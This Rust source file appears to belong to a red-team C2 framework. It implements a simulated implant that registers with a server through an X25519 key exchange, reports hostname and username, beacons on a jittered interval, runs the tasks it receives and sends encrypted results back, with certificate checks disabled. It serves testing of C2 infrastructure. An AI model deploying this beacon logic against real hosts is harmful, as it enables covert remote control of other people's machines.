//! Simulated implant for local testing of C2 infrastructure
//!
//! This crate provides a simulated implant that can register with and check in
//! to a C2 server over HTTP, useful for testing without deploying real implants.

use anyhow::{anyhow, Context, Result};
use common::ImplantId;
use config::ImplantConfig;
use crypto::{ImplantCrypto, X25519PublicKey};
use implant_core::ImplantRuntime;
use protocol::{
    decode, encode, CheckIn, CheckInResponse, ImplantRegistration, MessageEnvelope, MessageType,
    ProtocolVersion, RegistrationResponse, Task, TaskResponse, Timestamp, Uuid,
};
use std::time::Duration;
use tracing::{debug, error, info, warn};

/// Simulated implant for testing C2 infrastructure
pub struct SimulatedImplant {
    /// Server URL (e.g., "http://localhost:8080")
    server_url: String,
    /// Cryptographic context
    crypto: ImplantCrypto,
    /// Assigned implant ID (after registration)
    implant_id: Option<ImplantId>,
    /// Task execution runtime
    runtime: ImplantRuntime,
    /// HTTP client
    client: reqwest::Client,
    /// Pending task responses to send on next check-in
    pending_responses: Vec<TaskResponse>,
    /// Check-in interval in seconds
    checkin_interval: u32,
    /// Jitter percentage
    jitter_percent: u32,
}

impl SimulatedImplant {
    /// Create a new simulated implant
    ///
    /// # Arguments
    /// * `server_url` - Base URL of the C2 server (e.g., "http://localhost:8080")
    /// * `server_pub_key` - Server's static X25519 public key for key exchange
    pub fn new(server_url: String, server_pub_key: X25519PublicKey) -> Self {
        let crypto = ImplantCrypto::new(server_pub_key);
        let config = ImplantConfig::default();
        let checkin_interval = config.checkin_interval;
        let jitter_percent = config.jitter_percent;
        let runtime = ImplantRuntime::new();

        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(30))
            .danger_accept_invalid_certs(true) // For testing
            .build()
            .expect("failed to create HTTP client");

        Self {
            server_url,
            crypto,
            implant_id: None,
            runtime,
            client,
            pending_responses: Vec::new(),
            checkin_interval,
            jitter_percent,
        }
    }

    /// Create with custom configuration
    pub fn with_config(
        server_url: String,
        server_pub_key: X25519PublicKey,
        config: ImplantConfig,
    ) -> Self {
        let crypto = ImplantCrypto::new(server_pub_key);
        let checkin_interval = config.checkin_interval;
        let jitter_percent = config.jitter_percent;
        let runtime = ImplantRuntime::new();

        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(30))
            .danger_accept_invalid_certs(true)
            .build()
            .expect("failed to create HTTP client");

        Self {
            server_url,
            crypto,
            implant_id: None,
            runtime,
            client,
            pending_responses: Vec::new(),
            checkin_interval,
            jitter_percent,
        }
    }

    /// Register with the C2 server
    ///
    /// Performs X25519 key exchange and establishes a session key.
    /// Must be called before check-in.
    pub async fn register(&mut self) -> Result<()> {
        info!("starting registration with server: {}", self.server_url);

        // Step 1: Generate ephemeral keypair
        let (ephemeral_pub, ephemeral_priv) = self
            .crypto
            .generate_keypair()
            .map_err(|e| anyhow!("failed to generate keypair: {}", e))?;

        // Step 2: Collect system info
        let system_info = implant_core::sysinfo::gather();
        debug!(
            "collected system info: hostname={}, user={}",
            system_info.hostname, system_info.username
        );

        // Step 3: Build ImplantRegistration protobuf
        let registration = ImplantRegistration {
            ephemeral_public_key: ephemeral_pub.as_bytes().to_vec(),
            system_info: Some(system_info),
            protocol_version: Some(ProtocolVersion {
                major: 1,
                minor: 0,
                patch: 0,
            }),
            config_hash: Vec::new(), // No config hash for simulator
        };

        // Step 4: Wrap in MessageEnvelope
        let envelope = MessageEnvelope {
            message_type: MessageType::Registration as i32,
            payload: encode(&registration),
        };

        // Step 5: POST to /c
        let url = format!("{}/c", self.server_url);
        debug!("sending registration to {}", url);

        let response = self
            .client
            .post(&url)
            .body(encode(&envelope))
            .header("Content-Type", "application/octet-stream")
            .send()
            .await
            .context("failed to send registration request")?;

        if !response.status().is_success() {
            return Err(anyhow!(
                "registration failed with status: {}",
                response.status()
            ));
        }

        let response_bytes = response
            .bytes()
            .await
            .context("failed to read registration response")?;

        // Step 6: Parse RegistrationResponse
        let reg_response: RegistrationResponse = decode(&response_bytes)
            .map_err(|e| anyhow!("failed to decode registration response: {}", e))?;

        // Extract implant ID
        let implant_id_bytes = reg_response
            .implant_id
            .as_ref()
            .ok_or_else(|| anyhow!("registration response missing implant_id"))?
            .value
            .as_slice();

        let implant_id = ImplantId::from_bytes(implant_id_bytes)
            .map_err(|e| anyhow!("invalid implant_id: {}", e))?;

        info!("received implant_id: {}", implant_id);

        // Step 7: Do key exchange with server's ephemeral public key
        let server_ephemeral_pub = X25519PublicKey::from_bytes(&reg_response.server_public_key)
            .map_err(|e| anyhow!("invalid server ephemeral public key: {}", e))?;

        let shared_secret = self
            .crypto
            .key_exchange(&ephemeral_priv, &server_ephemeral_pub)
            .map_err(|e| anyhow!("key exchange failed: {}", e))?;

        // Step 8: Derive session key
        self.crypto
            .derive_session_key(&shared_secret)
            .map_err(|e| anyhow!("failed to derive session key: {}", e))?;

        // Step 9: Store implant_id
        self.implant_id = Some(implant_id);

        info!("registration successful, session established");
        Ok(())
    }

    /// Check in with the C2 server
    ///
    /// Sends any pending task responses and retrieves new tasks.
    /// Session must be established via register() first.
    pub async fn checkin(&mut self) -> Result<Vec<Task>> {
        let implant_id = self
            .implant_id
            .ok_or_else(|| anyhow!("not registered - call register() first"))?;

        if !self.crypto.is_session_established() {
            return Err(anyhow!("session not established"));
        }

        debug!(
            "checking in with {} pending responses",
            self.pending_responses.len()
        );

        // Step 1: Build CheckIn protobuf
        let checkin = CheckIn {
            implant_id: Some(Uuid {
                value: implant_id.as_bytes().to_vec(),
            }),
            local_time: Some(Timestamp::now()),
            task_responses: std::mem::take(&mut self.pending_responses),
            loaded_modules: Vec::new(), // No loaded modules for simulator
        };

        // Step 2: Encrypt with session key
        let plaintext = encode(&checkin);
        let encrypted = self
            .crypto
            .encrypt_message(&plaintext, implant_id)
            .map_err(|e| anyhow!("failed to encrypt check-in: {}", e))?;

        // Step 3: Wrap in MessageEnvelope (server expects all messages in envelope)
        let envelope = MessageEnvelope {
            message_type: MessageType::Checkin as i32,
            payload: encrypted,
        };

        // Step 4: POST to /c
        let url = format!("{}/c", self.server_url);
        debug!("sending check-in to {}", url);

        let response = self
            .client
            .post(&url)
            .body(encode(&envelope))
            .header("Content-Type", "application/octet-stream")
            .send()
            .await
            .context("failed to send check-in request")?;

        if !response.status().is_success() {
            return Err(anyhow!(
                "check-in failed with status: {}",
                response.status()
            ));
        }

        let response_bytes = response
            .bytes()
            .await
            .context("failed to read check-in response")?;

        // Step 4: Decrypt response
        let decrypted = self
            .crypto
            .decrypt_message(&response_bytes)
            .map_err(|e| anyhow!("failed to decrypt check-in response: {}", e))?;

        // Step 5: Parse CheckInResponse
        let checkin_response: CheckInResponse =
            decode(&decrypted).map_err(|e| anyhow!("failed to decode check-in response: {}", e))?;

        // Handle new check-in interval if provided
        if let Some(new_interval) = checkin_response.new_checkin_interval {
            info!("server updated check-in interval to {}s", new_interval);
            self.checkin_interval = new_interval;
        }

        if let Some(new_jitter) = checkin_response.new_jitter_percent {
            info!("server updated jitter to {}%", new_jitter);
            self.jitter_percent = new_jitter;
        }

        // Step 6: Return tasks
        let task_count = checkin_response.tasks.len();
        if task_count > 0 {
            info!("received {} tasks", task_count);
        } else {
            debug!("no tasks received");
        }

        Ok(checkin_response.tasks)
    }

    /// Run the main implant loop
    ///
    /// Registers with the server, then enters a check-in loop that:
    /// 1. Sleeps for the jittered check-in interval
    /// 2. Checks in and retrieves tasks
    /// 3. Executes tasks and queues responses
    /// 4. Repeats until exit is requested
    pub async fn run(&mut self) -> Result<()> {
        info!("simulated implant starting");

        // Register first
        self.register().await?;

        // Main loop
        loop {
            // Calculate jittered sleep duration
            let sleep_duration = self.jittered_interval();
            debug!(
                "sleeping for {}s before next check-in",
                sleep_duration.as_secs()
            );
            tokio::time::sleep(sleep_duration).await;

            // Check in and get tasks
            match self.checkin().await {
                Ok(tasks) => {
                    for task in tasks {
                        let task_id = task
                            .task_id
                            .as_ref()
                            .map(|u| hex::encode(&u.value))
                            .unwrap_or_else(|| "unknown".to_string());

                        info!("executing task {} (type: {})", task_id, task.task_type);

                        // Check for exit task
                        if task.task_type == "exit" {
                            info!("received exit task, shutting down");
                            let response = self.runtime.execute_task(&task).await;
                            self.pending_responses.push(response);

                            // Final check-in to report exit task completion
                            if let Err(e) = self.checkin().await {
                                warn!("final check-in failed: {}", e);
                            }
                            return Ok(());
                        }

                        // Execute other tasks
                        let response = self.runtime.execute_task(&task).await;
                        self.pending_responses.push(response);
                    }
                }
                Err(e) => {
                    error!("check-in failed: {}", e);
                    // Continue trying - could add backoff logic here
                }
            }
        }
    }

    /// Calculate sleep duration with jitter
    fn jittered_interval(&self) -> Duration {
        let base = self.checkin_interval as f64;

        if self.jitter_percent == 0 {
            return Duration::from_secs(base.max(1.0) as u64);
        }

        use rand::Rng;
        let jitter = self.jitter_percent as f64 / 100.0;
        let mut rng = rand::thread_rng();
        let factor = 1.0 + rng.gen_range(-jitter..jitter);
        let seconds = (base * factor).max(1.0) as u64;

        Duration::from_secs(seconds)
    }

    /// Get the assigned implant ID (if registered)
    pub fn implant_id(&self) -> Option<ImplantId> {
        self.implant_id
    }

    /// Check if the session is established
    pub fn is_registered(&self) -> bool {
        self.implant_id.is_some() && self.crypto.is_session_established()
    }

    /// Get the current check-in interval
    pub fn checkin_interval(&self) -> u32 {
        self.checkin_interval
    }

    /// Manually queue a task response
    pub fn queue_response(&mut self, response: TaskResponse) {
        self.pending_responses.push(response);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crypto::x25519::generate_keypair;

    #[test]
    fn test_simulated_implant_creation() {
        let (server_pub, _server_priv) = generate_keypair().unwrap();
        let implant = SimulatedImplant::new("http://localhost:8080".to_string(), server_pub);

        assert!(!implant.is_registered());
        assert!(implant.implant_id().is_none());
        assert_eq!(implant.checkin_interval(), 60);
    }

    #[test]
    fn test_jittered_interval() {
        let (server_pub, _) = generate_keypair().unwrap();
        let implant = SimulatedImplant::new("http://localhost:8080".to_string(), server_pub);

        // With 20% jitter on 60s, should be between 48s and 72s
        for _ in 0..100 {
            let duration = implant.jittered_interval();
            assert!(duration.as_secs() >= 48);
            assert!(duration.as_secs() <= 72);
        }
    }
}
